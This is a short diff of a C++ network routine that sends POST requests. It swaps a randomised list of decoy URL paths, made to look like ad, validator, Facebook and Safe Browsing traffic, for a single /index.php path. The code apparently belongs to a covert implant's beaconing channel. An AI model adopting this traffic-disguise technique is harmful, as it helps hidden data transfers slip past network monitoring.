@@ -987,10 +987,10 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 	HINTERNET hOpenHandle, hConnectHandle, hResourceHandle;
 
 	// La dimensione dell'array wRequest
-	#define REQUEST_SIZE 18
+	#define REQUEST_SIZE 1
 
 	WCHAR *wRequest[] = {
-		L"/",
+		L"/index.php"/*,
 		L"/pagead/show_ads.js",
 		L"/licenses/by-nc-nd/2.5/",
 		L"/css-validator/",
@@ -1007,7 +1007,7 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		L"/comments/new.js",
 		L"/feed/view?id=1&type=channel",
 		L"/ajax/MessageComposerEndpoint.php?__a=1",
-		L"/safebrowsing/downloads?client=navclient"
+		L"/safebrowsing/downloads?client=navclient"*/
 	};
 
 	wstring strHeaders = L"Accept: */*\r\n";
@@ -1035,7 +1035,7 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		return FALSE;
 	}
 
-	hResourceHandle = HttpOpenRequest(hConnectHandle, L"POST", wRequest[r.rand24() % REQUEST_SIZE], L"HTTP/1.0", NULL, NULL, 
+	hResourceHandle = HttpOpenRequest(hConnectHandle, L"POST", wRequest[0], L"HTTP/1.0", NULL, NULL, 
 		INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_COOKIES, 0);
 
 	if (hResourceHandle == NULL) {
